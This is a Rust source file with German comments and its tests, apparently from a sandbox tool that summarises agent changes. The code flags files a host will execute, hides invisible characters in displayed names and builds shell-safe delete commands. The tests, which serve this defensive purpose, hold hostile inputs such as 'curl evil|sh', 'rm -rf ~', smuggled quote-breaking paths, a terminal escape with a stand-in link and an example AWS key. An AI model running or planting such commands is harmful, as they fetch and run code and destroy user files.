/// So viele Hex-Zeichen des Pfad-Hashes stehen in der Zusammenfassung.
pub const PATH_HASH_CHARS: usize = 16;

/// Die ersten [`PATH_HASH_CHARS`] Hex-Zeichen des `SHA-256` über die rohen
/// Bytes eines Pfades.
///
/// Der Hash ist die Kennung, die [`display_path`] verliert: Zwei Namen, die
/// sich nur in einem unsichtbaren Zeichen unterscheiden, ergeben dieselbe
/// Anzeige und zwei verschiedene Hashes.
#[must_use]
pub fn path_hash(path: &Path) -> String {
    const NIBBLES: &[u8; 16] = b"0123456789abcdef";
    let digest = humanitl_core::http::sha256(path.as_os_str().as_encoded_bytes());
    let mut out = String::with_capacity(PATH_HASH_CHARS);
    for byte in digest.iter().take(PATH_HASH_CHARS.div_ceil(2)) {
        out.push(char::from(NIBBLES[usize::from(byte >> 4)]));
        out.push(char::from(NIBBLES[usize::from(byte & 0x0f)]));
    }
    out.truncate(PATH_HASH_CHARS);
    out
}

/// Die Zeile, in der ein Byte-Versatz liegt, 1-basiert.
///
/// [`Finding::span`] ist ein Byte-Bereich; die Oberfläche hat die Datei nicht
/// und kann die Zeile nicht selbst rechnen.
#[must_use]
pub fn line_of(bytes: &[u8], offset: usize) -> u32 {
    let end = offset.min(bytes.len());
    // Ein Puffer ohne Umbruch zerfällt in genau ein Stück: die erste Zeile.
    let lines = bytes[..end].split(|byte| *byte == b'\n').count();
    u32::try_from(lines).unwrap_or(u32::MAX)
}

/// Ob eine Datei als Text gilt und damit gescannt wird.
///
/// Die Heuristik ist ein `NUL`-Byte in den ersten [`TEXT_PROBE_BYTES`]: Sie
/// ist dieselbe, die `grep` und `git` benutzen, sie irrt sich bei `UTF-16` und
/// bei Binärdateien ohne Null im Kopf, und sie kostet nichts. Ein falsch
/// eingestufter Fund ist eine Zeile zu viel in einer Liste; eine gescannte
/// Binärdatei wären Megabytes Regex-Arbeit ohne Ertrag.
#[must_use]
pub fn looks_like_text(bytes: &[u8]) -> bool {
    !bytes.iter().take(TEXT_PROBE_BYTES).any(|byte| *byte == 0)
}

/// Ob eine Datei auf dem Host ausgeführt wird, sobald ein Mensch mit dem
/// Projekt weiterarbeitet.
///
/// Das ist der Kern von Kanal 1: Nicht jede geschriebene Datei ist gefährlich,
/// aber eine, die eine Werkzeugkette von selbst startet, ist es. Die Prüfung
/// ist Pfadmuster plus eine schmale Betrachtung des Inhalts, ohne eigenes
/// Parsen von `JSON` oder `TOML`:
///
/// - `.git/hooks/**` — läuft beim nächsten `git commit`, `git push` oder
///   `git checkout`,
/// - `.envrc` — läuft, sobald jemand mit `direnv` das Verzeichnis betritt,
/// - `.pre-commit-config.yaml` — lädt und startet Hooks beim Commit,
/// - `.github/workflows/**`, `.gitlab-ci.yml` und `Jenkinsfile` — läuft in der
///   Pipeline,
/// - `Makefile`, `GNUmakefile` — läuft bei `make`,
/// - `package.json` mit `preinstall`, `postinstall` oder `prepare` — läuft bei
///   `npm install`,
/// - `setup.py` — läuft bei `pip install`,
/// - `pyproject.toml` mit einem `[tool.*.scripts]` — trägt einen Einstiegspunkt,
/// - `Cargo.toml` mit einem `build`-Schlüssel — läuft bei `cargo build`.
///
/// Die Liste deckt damit dieselben Pfade ab, die `profiles/sandbox/default.toml`
/// überdeckt — genau die stehen dort, weil der Host sie ausführt. Wo die Maske
/// gefehlt hat (der Pfad existierte im Projekt nicht), ist diese Prüfung das,
/// was übrig bleibt.
///
/// Der Fund wird nicht geblockt, sondern gelistet: `FindingKind::Custom`
/// `"executable-on-host"`, Stufe [`Tier::Regex`].
#[must_use]
pub fn executable_on_host(path: &Path, bytes: &[u8]) -> bool {
    if path.starts_with(".github/workflows") || path.starts_with(".git/hooks") {
        return true;
    }
    let Some(name) = path.file_name().and_then(|name| name.to_str()) else {
        return false;
    };
    match name {
        ".gitlab-ci.yml"
        | "Jenkinsfile"
        | ".envrc"
        | ".pre-commit-config.yaml"
        | "setup.py"
        | "Makefile"
        | "GNUmakefile"
        | "makefile" => true,
        "package.json" => ["\"preinstall\"", "\"postinstall\"", "\"prepare\""]
            .iter()
            .any(|key| contains(bytes, key.as_bytes())),
        "pyproject.toml" => lines(bytes).any(|line| {
            let line = line.trim_ascii();
            line.starts_with(b"[tool.") && line.ends_with(b".scripts]")
        }),
        "Cargo.toml" => lines(bytes).any(|line| {
            let line = line.trim_ascii_start();
            line.starts_with(b"build ") || line.starts_with(b"build=")
        }),
        _ => false,
    }
}

/// Ob `haystack` `needle` enthält.
fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack
        .windows(needle.len())
        .any(|window| window == needle)
}

/// Die Zeilen eines Byte-Puffers, ohne Trennzeichen.
fn lines(bytes: &[u8]) -> impl Iterator<Item = &[u8]> {
    bytes.split(|byte| *byte == b'\n')
}

/// Ein Befehl für die Zwischenablage — oder keiner.
///
/// Es wäre der erste [`FixAction::CopyCommand`] im Baum, der aus fremden Bytes
/// entsteht, und er landet in der Shell eines Menschen. Der Pfad muss deshalb
/// **roh** hereinkommen, nie als Anzeige aus [`display_path`]: Ein
/// `.gitignore\u{200b}` sieht dort aus wie `.gitignore`, und der Befehl löschte
/// die echte Datei des Nutzers.
///
/// Ein Befehl entsteht nur, wenn alles vier zutrifft:
///
/// 1. Der Pfad ist gültiges `UTF-8`. Ein verlorenes Byte wäre ein anderer
///    Pfad.
/// 2. [`sanitize_note`] ändert ihn nicht. Das schützt nicht die Shell, sondern
///    das Auge: Steuerzeichen, Zeilenumbrüche, unsichtbare Zeichen,
///    Bidi-Umkehrungen und Überlänge sind damit ausgeschlossen, und was im
///    Befund steht, ist auch das, was der Mensch einfügt.
/// 3. **Die Zitierung ist wörtlich.** `shlex::try_quote` liefert entweder den
///    Text unverändert (dann braucht er keine Zitierung) oder genau ein Paar
///    einfacher Anführungszeichen ohne ein weiteres `'` dazwischen. Beides ist
///    in jeder POSIX-Shell wörtlich: Zwischen einfachen Anführungszeichen hat
///    kein Zeichen eine Sonderbedeutung, auch `$(`, `` ` ``, `;`, `|`, `*`,
///    `"` und `\` nicht. Alles andere — insbesondere die Form `'a'\''b'`, mit
///    der `shlex` ein enthaltenes `'` auflöst — wird abgelehnt, statt sie
///    nachzuprüfen.
/// 4. `shlex::split` macht aus der Zitierung wieder genau diesen einen Pfad.
///
/// Sonst: `None`. Der Befund zeigt den Pfad dann nur an.
#[must_use]
pub fn copy_command(host_path: &Path) -> Option<String> {
    let text = host_path.to_str()?;
    if text.is_empty() || text != sanitize_note(text) {
        return None;
    }
    let quoted = shlex::try_quote(text).ok()?;
    if !is_literal_word(&quoted, text) {
        return None;
    }
    let back = shlex::split(&quoted)?;
    if back.len() != 1 || back.first().map(String::as_str) != Some(text) {
        return None;
    }
    Some(format!("rm -- {quoted}"))
}

/// Ob `quoted` ein wörtliches Wort für `text` ist: unverändert oder genau ein
/// Paar einfacher Anführungszeichen ohne ein weiteres `'` im Inneren.
fn is_literal_word(quoted: &str, text: &str) -> bool {
    if quoted == text {
        return true;
    }
    let Some(inner) = quoted.strip_prefix('\'').and_then(|q| q.strip_suffix('\'')) else {
        return false;
    };
    !inner.contains('\'') && inner == text
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

    use std::path::{Path, PathBuf};

    use humanitl_core::ids::{SandboxId, SessionId};
    use humanitl_core::{Finding, FindingKind, FindingLocation, FixAction, Tier};

    use super::{
        ChangeKind, SessionSummary, SummaryFinding, copy_command, display_path, executable_on_host,
        line_of, looks_like_text,
    };

    fn summary() -> SessionSummary {
        SessionSummary::new(
            SessionId::nil(),
            SandboxId::nil(),
            Path::new("/home/u/project"),
        )
    }

    fn codes(summary: &SessionSummary) -> Vec<&'static str> {
        summary
            .diagnostics()
            .iter()
            .map(|diagnostic| diagnostic.code.as_str())
            .collect()
    }

    #[test]
    fn findings_in_added_file() {
        // Der Wert ist zur Laufzeit aus zwei Teilen zusammengesetzt, damit der
        // Push-Schutz von GitHub nicht auf einen Testwert anspringt
        // (CONVENTIONS 4.13).
        let secret = format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE");
        let bytes = format!("line one\nkey = {secret}\n").into_bytes();
        let start = bytes
            .windows(secret.len())
            .position(|window| window == secret.as_bytes())
            .expect("the secret is in the buffer");
        let finding = Finding::new(
            FindingKind::ApiKey("aws".to_owned()),
            start..start + secret.len(),
            FindingLocation::Body,
            Tier::Checksum,
            &secret,
        );

        let mut summary = summary();
        summary.add_finding(SummaryFinding::from_finding(
            Path::new("config/creds.env"),
            &bytes,
            &finding,
        ));

        let found = summary.findings.first().expect("one finding");
        assert_eq!(found.path, "config/creds.env");
        assert_eq!(found.line, 2, "the daemon counts the line, not the UI");
        assert_eq!(found.kind, "api_key:aws");
        assert_eq!(found.tier, Tier::Checksum);
        assert_eq!(found.display_prefix, "AKIAIOSF…");
        assert!(
            !found.display_prefix.contains(&secret),
            "the value never leaves the file"
        );
        assert!(codes(&summary).contains(&"SANDBOX_023"), "{summary:?}");
    }

    #[test]
    fn workflow_detector_flags_github_workflow() {
        assert!(executable_on_host(
            Path::new(".github/workflows/ci.yml"),
            b"on: push\n"
        ));
        assert!(executable_on_host(
            Path::new(".gitlab-ci.yml"),
            b"stages:\n"
        ));
        assert!(executable_on_host(Path::new("Makefile"), b"all:\n"));
        assert!(executable_on_host(Path::new("sub/Makefile"), b"all:\n"));
        assert!(executable_on_host(Path::new("setup.py"), b"import x\n"));
        assert!(executable_on_host(
            Path::new("package.json"),
            br#"{"scripts": {"postinstall": "curl x | sh"}}"#
        ));
        assert!(executable_on_host(
            Path::new("pyproject.toml"),
            b"[tool.poetry.scripts]\nx = \"y\"\n"
        ));
        assert!(executable_on_host(
            Path::new("Cargo.toml"),
            b"[package]\nbuild = \"build.rs\"\n"
        ));

        // Die Pfade, die `profiles/sandbox/default.toml` überdeckt, weil der
        // Host sie ausführt: Fehlt die Maske, ist diese Prüfung das, was übrig
        // bleibt.
        assert!(executable_on_host(
            Path::new(".git/hooks/pre-commit"),
            b"#!/bin/sh\ncurl evil\n"
        ));
        assert!(executable_on_host(Path::new(".envrc"), b"export X=1\n"));
        assert!(executable_on_host(
            Path::new(".pre-commit-config.yaml"),
            b"repos: []\n"
        ));
        assert!(executable_on_host(
            Path::new("Jenkinsfile"),
            b"pipeline {}\n"
        ));

        assert!(!executable_on_host(Path::new("README.md"), b"# hi\n"));
        assert!(
            !executable_on_host(Path::new("package.json"), br#"{"name": "x"}"#),
            "a package.json without a lifecycle script runs nothing"
        );
        assert!(
            !executable_on_host(Path::new("Cargo.toml"), b"[package]\nname = \"x\"\n"),
            "a Cargo.toml without build = runs nothing"
        );
        assert!(
            !executable_on_host(Path::new("docs/.github/workflows/x.yml"), b"on: push\n"),
            "only the workflow directory at the root of the project runs"
        );
    }

    /// Der Befehl landet in der Shell eines Menschen; geprüft wird die ganze
    /// Zeichenkette, nicht ihr Anfang.
    ///
    /// Ein `starts_with("rm -- ")` wäre auch dann grün, wenn die Zitierung
    /// ganz fehlte — genau die Mutation, die diesen Test überhaupt nötig
    /// gemacht hat. Jeder Fall nennt deshalb den erwarteten Wert, und
    /// `shlex::split` muss daraus wieder genau drei Wörter machen, deren
    /// drittes der Pfad ist.
    #[test]
    fn copy_command_is_shell_safe() {
        // Ein Pfad ohne Sonderzeichen braucht keine Zitierung.
        assert_eq!(
            copy_command(Path::new("/home/u/project/link")).as_deref(),
            Some("rm -- /home/u/project/link")
        );

        // Alles, was einer Shell etwas bedeutet, steht wörtlich zwischen genau
        // einem Paar einfacher Anführungszeichen.
        for raw in [
            "/w/pro ject/link",
            "/w/$(curl evil|sh)",
            "/w/`id`",
            "/w/a;rm -rf ~",
            "/w/a\"b",
            "/w/a|b",
            "/w/*",
            "/w/a&b",
            "/w/a$b",
            "/w/a>b<c",
            "/w/a\tb",
        ] {
            let command =
                copy_command(Path::new(raw)).unwrap_or_else(|| panic!("{raw:?} is quotable"));
            assert_eq!(
                command,
                format!("rm -- '{raw}'"),
                "{raw:?} must be one literal single-quoted word"
            );
            let words =
                shlex::split(&command).unwrap_or_else(|| panic!("{command:?} does not parse"));
            assert_eq!(
                words,
                vec!["rm".to_owned(), "--".to_owned(), raw.to_owned()],
                "{command:?} must be exactly three words"
            );
        }

        // Drei Formen, die `shlex` erzeugt und die nicht wörtlich sind. Alle
        // drei werden abgelehnt, statt sie nachzuprüfen:
        //
        //   a'b   ->  'a'\''b'    ein Paar reicht nicht mehr
        //   a\b   ->  "a\\b"      doppelte Anführungszeichen; darin behalten
        //                         $, ` und \ ihre Bedeutung
        //   a^b   ->  a'^b'       nur ein Teil des Wortes ist zitiert
        assert_eq!(copy_command(Path::new("/w/a'; rm -rf ~; '")), None);
        assert_eq!(copy_command(Path::new("/w/a'b")), None, "no apostrophe");
        assert_eq!(
            copy_command(Path::new("/w/a\\b")),
            None,
            "shlex answers with double quotes, which are not literal"
        );
        assert_eq!(
            copy_command(Path::new("/w/a^b")),
            None,
            "shlex quotes only part of the word"
        );

        // Was `sanitize_note` verändern würde, ergibt keinen Befehl: Der
        // Mensch soll einfügen, was er sieht.
        assert_eq!(copy_command(Path::new("/w/a\nb")), None, "no newline");
        assert_eq!(copy_command(Path::new("/w/a\u{202e}b")), None, "no bidi");
        assert_eq!(
            copy_command(Path::new("/w/a\u{200b}b")),
            None,
            "no zero width"
        );
        assert_eq!(copy_command(Path::new("/w/a\u{7}b")), None, "no control");
        assert_eq!(copy_command(Path::new("")), None);
        assert_eq!(
            copy_command(Path::new(&format!("/w/{}", "x".repeat(600)))),
            None,
            "no path over the display cap"
        );
    }

    /// Ein Baum mit den drei Symlinks, die der Test braucht, samt
    /// Zusammenfassung darüber.
    fn summary_over(links: &[(&str, &str)]) -> (tempfile::TempDir, SessionSummary) {
        let dir = tempfile::tempdir().expect("tempdir");
        let root = dir.path();
        std::fs::write(root.join("sibling"), b"x").expect("write");
        let limits = crate::worktree::SnapshotLimits::default();
        let before = crate::worktree::snapshot(root, &limits).expect("snapshot");
        for (name, target) in links {
            std::os::unix::fs::symlink(target, root.join(name)).expect("symlink");
        }
        let after = crate::worktree::snapshot(root, &limits).expect("snapshot");
        let mut summary = SessionSummary::new(SessionId::nil(), SandboxId::nil(), root);
        let _candidates = summary.add_changes(root, &before, &after);
        (dir, summary)
    }

    #[test]
    fn an_escaping_symlink_is_a_warning_and_a_safe_command() {
        let (dir, summary) = summary_over(&[("out", "/etc"), ("inside", "sibling")]);

        let diagnostics = summary.diagnostics();
        assert_eq!(diagnostics.len(), 1, "only the escaping one is reported");
        let first = diagnostics.first().expect("one diagnostic");
        assert_eq!(first.code.as_str(), "SANDBOX_022");
        assert!(first.why.contains("out"), "{}", first.why);
        assert!(first.why.contains("/etc"), "{}", first.why);
        assert_eq!(
            first.fix,
            Some(FixAction::CopyCommand(format!(
                "rm -- {}",
                dir.path().join("out").display()
            ))),
            "the command names the real path on the host"
        );
    }

    /// Der Befehl entsteht aus dem **rohen** Namen, nie aus der Anzeige.
    ///
    /// Der Angriff: ein Symlink `.gitignore\u{200b}` auf `/etc`. Die Anzeige
    /// sagt `.gitignore`; ein Befehl daraus löschte die echte `.gitignore` des
    /// Nutzers. Also gibt es hier gar keinen Befehl.
    #[test]
    fn a_hostile_symlink_name_gets_no_command() {
        // Die ersten drei überleben die Anzeige nicht, der vierte bricht an der
        // Zitierung: zwei verschiedene Gründe, dieselbe Antwort.
        for (name, mangled) in [
            (".gitignore\u{200b}", true),
            ("name\u{202e}txt", true),
            ("bell\u{7}", true),
            ("a'; curl evil|sh; '", false),
        ] {
            let (dir, summary) = summary_over(&[(name, "/etc")]);
            let link = summary.symlinks.first().expect("one symlink");
            assert!(link.escapes);
            assert_eq!(link.fix_command, None, "{name:?} must yield no command");
            assert_eq!(link.mangled, mangled, "{name:?}");
            assert!(
                dir.path().join(name).symlink_metadata().is_ok(),
                "the real name is still on disk"
            );

            let first = summary.diagnostics();
            let first = first.first().expect("one diagnostic");
            assert_eq!(first.fix, None, "no command out of foreign bytes");
        }

        // Und die Gegenprobe: derselbe Name ohne das unsichtbare Zeichen
        // bekommt sehr wohl einen Befehl. Ohne sie wäre der Test auch dann
        // grün, wenn es nie einen Befehl gäbe.
        let (dir, summary) = summary_over(&[(".gitignore", "/etc")]);
        let link = summary.symlinks.first().expect("one symlink");
        assert_eq!(
            link.fix_command,
            Some(format!("rm -- {}", dir.path().join(".gitignore").display()))
        );
        assert!(!link.mangled);
    }

    /// Zwei Namen, die sich nur in einem unsichtbaren Zeichen unterscheiden,
    /// bleiben in der Zusammenfassung auseinanderzuhalten.
    #[test]
    fn two_names_that_look_alike_keep_two_identities() {
        let (_dir, summary) = summary_over(&[("same", "/etc"), ("same\u{200b}", "/etc")]);
        assert_eq!(summary.symlinks.len(), 2);
        let shown: Vec<&str> = summary
            .symlinks
            .iter()
            .map(|link| link.path.as_str())
            .collect();
        assert_eq!(shown[0], shown[1], "the display cannot tell them apart");
        assert_ne!(
            summary.symlinks[0].path_hash, summary.symlinks[1].path_hash,
            "but the hash can"
        );
        assert_eq!(
            summary.symlinks[0].path_hash.len(),
            super::PATH_HASH_CHARS,
            "{}",
            summary.symlinks[0].path_hash
        );
    }

    /// Ein Hook gehört nicht in die eingeklappte Gruppe „Git metadata".
    #[test]
    fn git_hooks_are_not_git_metadata() {
        assert!(super::is_git_metadata(Path::new(".git/index")));
        assert!(super::is_git_metadata(Path::new(".git/refs/heads/main")));
        assert!(
            !super::is_git_metadata(Path::new(".git/hooks/pre-commit")),
            "what lies there runs at the next commit"
        );
        assert!(!super::is_git_metadata(Path::new("src/main.rs")));
    }

    /// Eine Änderung unter einem Pfad ohne Maske ist ein Befund, keine Zeile.
    #[test]
    fn a_change_under_an_unmasked_path_is_reported() {
        let dir = tempfile::tempdir().expect("tempdir");
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git")).expect("git dir");
        let limits = crate::worktree::SnapshotLimits::default();
        let before = crate::worktree::snapshot(root, &limits).expect("snapshot");

        std::fs::create_dir_all(root.join(".git/hooks")).expect("hooks");
        std::fs::write(root.join(".git/hooks/pre-commit"), b"#!/bin/sh\n").expect("hook");
        std::fs::write(root.join("README.md"), b"# hi\n").expect("readme");
        let after = crate::worktree::snapshot(root, &limits).expect("snapshot");

        let mut summary = SessionSummary::new(SessionId::nil(), SandboxId::nil(), root);
        // Drei Lücken, aber nur unter einer ist etwas entstanden.
        summary.set_unprotected(&[
            PathBuf::from(".git/hooks"),
            PathBuf::from(".idea"),
            PathBuf::from(".pre-commit-config.yaml"),
        ]);
        let _candidates = summary.add_changes(root, &before, &after);

        let hook = summary
            .changes
            .iter()
            .find(|change| change.path == ".git/hooks/pre-commit")
            .expect("the hook is listed");
        assert_eq!(
            hook.unprotected_by.as_deref(),
            Some(".git/hooks"),
            "the record names which cover was missing"
        );
        assert!(!hook.git_metadata, "and it is not tucked away as metadata");
        let readme = summary
            .changes
            .iter()
            .find(|change| change.path == "README.md")
            .expect("the readme is listed");
        assert_eq!(readme.unprotected_by, None);

        let found = codes(&summary);
        assert!(found.contains(&"SANDBOX_025"), "{found:?}");
        let diagnostic = summary
            .diagnostics()
            .into_iter()
            .find(|diagnostic| diagnostic.code.as_str() == "SANDBOX_025")
            .expect("the finding exists");
        // Nur die getroffene Lücke, nicht die ganze Liste, und die Zahl genau
        // einmal: Sonst läse sich der Satz, als sei an drei Stellen etwas
        // passiert.
        assert!(diagnostic.why.contains(".git/hooks"), "{}", diagnostic.why);
        assert!(
            !diagnostic.why.contains(".idea"),
            "a gap that nothing was written under is not named: {}",
            diagnostic.why
        );
        assert!(
            !diagnostic.why.contains(".pre-commit-config.yaml"),
            "a gap that nothing was written under is not named: {}",
            diagnostic.why
        );
        assert_eq!(
            diagnostic.why.matches("1 file(s)").count(),
            1,
            "one hook, and the count appears exactly once: {}",
            diagnostic.why
        );
        assert!(
            diagnostic.why.contains(".git/hooks/pre-commit"),
            "the first affected file is named: {}",
            diagnostic.why
        );

        // Ohne die Lücke gibt es den Befund nicht.
        let mut quiet = SessionSummary::new(SessionId::nil(), SandboxId::nil(), root);
        let _candidates = quiet.add_changes(root, &before, &after);
        assert!(
            !codes(&quiet).contains(&"SANDBOX_025"),
            "{:?}",
            codes(&quiet)
        );
    }

    #[test]
    fn a_truncated_snapshot_says_so() {
        let mut summary = summary();
        assert!(codes(&summary).is_empty());
        summary.truncated = true;
        assert_eq!(codes(&summary), vec!["SANDBOX_024"]);
    }

    #[test]
    fn a_path_from_the_agent_is_sanitized_before_it_is_shown() {
        // OSC 8 mit einem Zeilenumbruch und einer Textrichtungsumkehr im Namen.
        let hostile = "\u{1b}]8;;http://evil\u{7}gnp\u{202e}exe\r\nsecond";
        let shown = display_path(Path::new(hostile));
        assert!(!shown.contains('\u{1b}'), "{shown:?}");
        assert!(!shown.contains('\u{202e}'), "{shown:?}");
        assert!(!shown.contains('\r'), "{shown:?}");
        assert!(!shown.contains('\n'), "{shown:?}");
    }

    #[test]
    fn the_lists_stop_at_their_budget() {
        let mut summary = summary();
        for n in 0..(super::MAX_FINDINGS + 5) {
            summary.add_finding(SummaryFinding {
                path: format!("f{n}"),
                path_hash: String::new(),
                mangled: false,
                line: 1,
                kind: "custom:x".to_owned(),
                tier: Tier::Regex,
                display_prefix: String::new(),
                value_hash: String::new(),
            });
        }
        assert_eq!(summary.findings.len(), super::MAX_FINDINGS);
        assert!(summary.truncated);
    }

    #[test]
    fn line_of_counts_from_one() {
        assert_eq!(line_of(b"", 0), 1);
        assert_eq!(line_of(b"abc", 2), 1);
        assert_eq!(line_of(b"a\nb", 2), 2);
        assert_eq!(line_of(b"a\nb\nc", 4), 3);
        assert_eq!(line_of(b"a\nb", 999), 2, "an offset past the end is capped");
    }

    #[test]
    fn binary_files_are_not_scanned() {
        assert!(looks_like_text(b"plain text\n"));
        assert!(!looks_like_text(b"\x7fELF\0\0\0"));
        assert!(
            looks_like_text(&[b'x'; super::TEXT_PROBE_BYTES + 8]),
            "a long text stays text"
        );
    }

    /// Der Fundscan liest die **rohen** Pfade, nie die angezeigten.
    ///
    /// Ein Name mit einem Steuerzeichen sieht in der Tabelle anders aus als auf
    /// der Platte; wer den angezeigten Namen öffnete, öffnete eine andere Datei
    /// oder keine.
    #[test]
    fn add_changes_returns_the_raw_paths_of_the_new_and_changed_files() {
        let dir = tempfile::tempdir().expect("tempdir");
        let root = dir.path();
        std::fs::write(root.join("keep.txt"), b"same").expect("write");
        std::fs::write(root.join("gone.txt"), b"bye").expect("write");
        let limits = crate::worktree::SnapshotLimits::default();
        let before = crate::worktree::snapshot(root, &limits).expect("snapshot");

        // Ein Name, den `sanitize_note` verändert, und einer, der bleibt.
        let hostile = "new\u{202e}txt";
        std::fs::write(root.join(hostile), b"AKIA-ish").expect("write");
        std::fs::write(root.join("changed.txt"), b"after").expect("write");
        std::fs::remove_file(root.join("gone.txt")).expect("remove");
        std::os::unix::fs::symlink("/etc", root.join("link")).expect("symlink");
        let after = crate::worktree::snapshot(root, &limits).expect("snapshot");

        let mut summary = summary();
        let candidates = summary.add_changes(root, &before, &after);
        let named = |name: &str| {
            candidates
                .iter()
                .any(|candidate| candidate.path == Path::new(name))
        };

        assert!(named(hostile), "{candidates:?}");
        assert!(named("changed.txt"), "{candidates:?}");
        assert!(
            !named("gone.txt"),
            "a deleted file has nothing to scan: {candidates:?}"
        );
        assert!(!named("link"), "a symlink is never opened: {candidates:?}");
        assert!(
            !named("keep.txt"),
            "an untouched file has nothing new in it: {candidates:?}"
        );

        // Jeder Kandidat zeigt auf seine eigene Zeile: Ohne das könnte der
        // Scan nicht vermerken, was er nicht gelesen hat.
        for candidate in &candidates {
            let row = summary
                .changes
                .get(candidate.row)
                .expect("every candidate points at a row of its own");
            assert_eq!(row.size, candidate.size, "{candidate:?} / {row:?}");
            assert!(matches!(row.kind, ChangeKind::Added | ChangeKind::Modified));
        }

        // Und der angezeigte Name ist ein anderer als der auf der Platte.
        let shown = summary
            .changes
            .iter()
            .find(|change| change.kind == ChangeKind::Added)
            .expect("the added file is listed");
        assert_ne!(shown.path, hostile, "the shown name is sanitized");
        assert!(!shown.path.contains('\u{202e}'), "{:?}", shown.path);
    }
}
